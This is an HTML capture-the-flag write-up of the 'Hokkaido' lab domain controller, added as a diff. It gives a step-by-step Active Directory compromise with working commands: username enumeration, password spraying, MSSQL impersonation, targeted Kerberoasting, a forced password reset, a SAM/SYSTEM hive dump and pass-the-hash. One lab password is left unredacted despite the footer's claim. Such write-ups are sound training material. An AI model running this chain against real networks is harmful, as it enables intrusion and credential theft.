@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Hokkaido &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Hokkaido</h1>
+    <div class="meta">Target: <code>192.168.126.40</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">ActiveDirectory</span><span class="tag">Kerberoasting</span><span class="tag">TargetedKerberoasting</span><span class="tag">MSSQL</span><span class="tag">Impersonation</span><span class="tag">GenericWrite</span><span class="tag">SeBackupPrivilege</span><span class="tag">SAMDump</span><span class="tag">PassTheHash</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#nmap">Nmap</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#kerbrute-username-enumeration">Kerbrute Username Enumeration</a><a class="lvl3" href="#password-spraying-username-as-password">Password Spraying, Username as Password</a><a class="lvl3" href="#netlogon-share-default-password-leak">NETLOGON Share, Default Password Leak</a><a class="lvl3" href="#kerberoasting-hash-acquired-not-cracked">Kerberoasting, Hash Acquired, Not Cracked</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#mssql-impersonation-to-restricted-database">MSSQL Impersonation to Restricted Database</a><a class="lvl3" href="#bloodhound-genericwrite-to-targeted-kerberoast">BloodHound, GenericWrite to Targeted Kerberoast</a><a class="lvl3" href="#it-group-password-reset-sebackupprivilege">IT Group → Password Reset → SeBackupPrivilege</a><a class="lvl3" href="#sam-system-dump">SAM/SYSTEM Dump</a><a class="lvl2" href="#root-system">Root / SYSTEM</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Hokkaido is an Active Directory domain controller running MSSQL. The attack chains four distinct techniques: kerbrute username enumeration discovers valid accounts, password spraying yields <code>info:info</code>, a NETLOGON share leaks an initial password, and Kerberoasting finds <code>maintenance</code>'s ticket but fails to crack it. The real path runs through MSSQL impersonation to access a restricted database, reading plaintext credentials for <code>hrapp-service</code> from a <code>sysauth</code> table. BloodHound then reveals <code>hrapp-service</code> has GenericWrite over <code>Hazel.Green</code>, enabling targeted Kerberoasting. Hazel's cracked hash leads to a password change for a Tier 1 admin, SeBackupPrivilege, and a SAM/SYSTEM dump that produces the Administrator NT hash.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE       VERSION
+53/tcp   open  domain
+80/tcp   open  http          Microsoft IIS httpd 10.0
+88/tcp   open  kerberos-sec
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com)
+445/tcp  open  microsoft-ds
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+3389/tcp open  ms-wbt-server
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
+</code></pre>
+<p>The domain is <code>hokkaido-aerospace.com</code>, DC hostname is <code>dc.hokkaido-aerospace.com</code> (NetBIOS: HAERO). MSSQL on 1433 is notable alongside the standard DC service ports.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="kerbrute-username-enumeration">Kerbrute Username Enumeration</h3>
+<p>Without credentials, kerbrute can enumerate valid Kerberos principals by timing AS-REQ responses:</p>
+<pre><code class="language-sh">kerbrute userenum -d hokkaido-aerospace.com --dc 192.168.126.40 \
+  /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -t 100
+
+[+] VALID USERNAME: info@hokkaido-aerospace.com
+[+] VALID USERNAME: administrator@hokkaido-aerospace.com
+[+] VALID USERNAME: discovery@hokkaido-aerospace.com
+[+] VALID USERNAME: maintenance@hokkaido-aerospace.com
+</code></pre>
+<h3 id="password-spraying-username-as-password">Password Spraying, Username as Password</h3>
+<p>Spraying the discovered usernames against themselves is a quick check for "firstname equals password" patterns common in freshly-built lab domains:</p>
+<pre><code class="language-sh">nxc smb 192.168.126.40 --shares -u users.txt -p users.txt --continue-on-success
+SMB  192.168.126.40  445  DC  [+] hokkaido-aerospace.com\info:info
+</code></pre>
+<p>Credentials:</p>
+<pre><code>info : info
+</code></pre>
+<h3 id="netlogon-share-default-password-leak">NETLOGON Share, Default Password Leak</h3>
+<p>Browsing SMB as <code>info</code> finds a non-default <code>homes</code> share with home directories for 21 users. The <code>NETLOGON</code> share contains a <code>temp</code> folder with a file:</p>
+<pre><code class="language-sh">cat password_reset.txt
+Initial Password: ‹redacted›
+</code></pre>
+<p>Spraying this password against all discovered users:</p>
+<pre><code class="language-sh">nxc smb 192.168.126.40 -u users.txt -p '‹redacted›' --continue-on-success
+SMB  192.168.126.40  445  DC  [+] hokkaido-aerospace.com\discovery:‹redacted›
+</code></pre>
+<p>Two credential pairs now:</p>
+<pre><code>info : info
+discovery : ‹redacted›
+</code></pre>
+<h3 id="kerberoasting-hash-acquired-not-cracked">Kerberoasting, Hash Acquired, Not Cracked</h3>
+<p><code>discovery:‹redacted›</code> authenticates to the domain. Kerberoasting returns two tickets, <code>discovery</code> (already known) and <code>maintenance</code>. Hashcat finds no match for <code>maintenance</code>'s hash against rockyou.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="mssql-impersonation-to-restricted-database">MSSQL Impersonation to Restricted Database</h3>
+<p><code>discovery</code> authenticates to MSSQL. The default databases are accessible, but <code>hrappdb</code> is off-limits under this user:</p>
+<pre><code class="language-sh">impacket-mssqlclient 'hokkaido-aerospace.com/discovery':'‹redacted›'@192.168.126.40 -dc-ip 192.168.126.40 -windows-auth
+</code></pre>
+<p>Querying for impersonatable logins:</p>
+<pre><code class="language-sql">SELECT distinct b.name FROM sys.server_permissions a
+INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE'
+</code></pre>
+<p>Output:</p>
+<pre><code>hrappdb-reader
+</code></pre>
+<p>Switching context and accessing the restricted database:</p>
+<pre><code class="language-sql">EXECUTE AS LOGIN = 'hrappdb-reader';
+USE hrappdb;
+SELECT * FROM sysauth;
+</code></pre>
+<pre><code>id   name              password
+--   ----------------  ----------------
+ 0   hrapp-service     ‹redacted›
+</code></pre>
+<blockquote>
+<p><strong>How MSSQL impersonation works:</strong> EXECUTE AS LOGIN changes the security context for the current session to that of another login, provided the current login has been granted IMPERSONATE on the target. It's a legitimate SQL Server feature for delegation, but when a low-privileged account can impersonate a higher-privileged one that can access sensitive databases, it becomes a lateral movement path. No password is required, the grant itself is the permission.</p>
+</blockquote>
+<p>Credentials:</p>
+<pre><code>hrapp-service : ‹redacted›
+</code></pre>
+<h3 id="bloodhound-genericwrite-to-targeted-kerberoast">BloodHound, GenericWrite to Targeted Kerberoast</h3>
+<p>BloodHound ingestion with <code>hrapp-service</code>'s credentials reveals: <code>hrapp-service</code> has <strong>GenericWrite</strong> over <code>Hazel.Green</code>, a Tier 2 admin account. GenericWrite allows writing arbitrary attributes on an AD object, including setting an SPN, which enables targeted Kerberoasting.</p>
+<pre><code class="language-sh">bloodhound-ce-python -u &quot;hrapp-service&quot; -p '‹redacted›' -d hokkaido-aerospace.com -c all --zip -ns 192.168.126.40
+</code></pre>
+<p>Running targeted Kerberoast:</p>
+<pre><code class="language-sh">targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p '‹redacted›' --dc-ip 192.168.126.40
+</code></pre>
+<p>Returns a TGS ticket for <code>Hazel.Green</code>. Cracking with hashcat:</p>
+<pre><code class="language-sh">hashcat -m 13100 hash --force /usr/share/wordlists/rockyou.txt
+</code></pre>
+<p>Credentials:</p>
+<pre><code>Hazel.Green : ‹redacted›
+</code></pre>
+<blockquote>
+<p><strong>Targeted Kerberoasting via GenericWrite:</strong> normally Kerberoasting only works against accounts that already have an SPN. GenericWrite lets the attacker set an SPN on any target account, making it Kerberoastable on demand. After extracting the TGS, the SPN can be removed to avoid traces. The attack was documented by Charlie Clark and Elad Shamir as part of DACL abuse research.</p>
+</blockquote>
+<h3 id="it-group-password-reset-sebackupprivilege">IT Group → Password Reset → SeBackupPrivilege</h3>
+<p>BloodHound shows <code>Hazel.Green</code> belongs to the IT Group, which has permission to change passwords for Tier 1 admin users. Target: <code>Molly.Smith</code>.</p>
+<pre><code class="language-sh">rpcclient -N 192.168.126.40 -U 'hazel.green%haze1988'
+rpcclient $&gt; setuserinfo2 MOLLY.SMITH 23 'Password123!'
+</code></pre>
+<p>RDP as <code>molly.smith</code> with the new password (running CMD as administrator is critical):</p>
+<pre><code class="language-sh">xfreerdp /u:molly.smith /p:'Password123!' /v:192.168.126.40 +clipboard /drive:/home/kali
+</code></pre>
+<p><code>whoami /priv</code> shows:</p>
+<pre><code>SeBackupPrivilege   Back up files and directories   Disabled
+</code></pre>
+<h3 id="sam-system-dump">SAM/SYSTEM Dump</h3>
+<p>SeBackupPrivilege allows reading any file on the system regardless of ACL, including the SAM and SYSTEM registry hives:</p>
+<pre><code class="language-cmd">reg save hklm\sam C:\Users\molly.smith\desktop\sam
+reg save hklm\system C:\Users\molly.smith\desktop\system
+</code></pre>
+<p>Transfer the hives over the RDP-linked file share, then extract hashes locally:</p>
+<pre><code class="language-sh">impacket-secretsdump -system system -sam sam local
+</code></pre>
+<p>Pass the Administrator NT hash:</p>
+<pre><code class="language-sh">evil-winrm -i 192.168.126.40 -u administrator -H ‹redacted›
+</code></pre>
+<h2 id="root-system">Root / SYSTEM</h2>
+<pre><code class="language-sh">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+haero\administrator
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>MSSQL impersonation is an underused lateral-move primitive.</strong> The <code>EXECUTE AS LOGIN</code> grant is easy to miss without specifically querying <code>sys.server_permissions</code>. It can bridge from a low-privileged SQL login to a context that can read sensitive databases.</li>
+<li><strong>GenericWrite enables Kerberoasting on demand.</strong> Any account writeable by the attacker becomes a Kerberoast target, even accounts without an SPN. This converts a generic AD write permission into a credential-cracking opportunity.</li>
+<li><strong>SeBackupPrivilege on a DC means full compromise.</strong> The privilege bypasses all file ACLs, which means the SAM and SYSTEM hives are readable. Secretsdump then produces every local hash, including the built-in Administrator.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
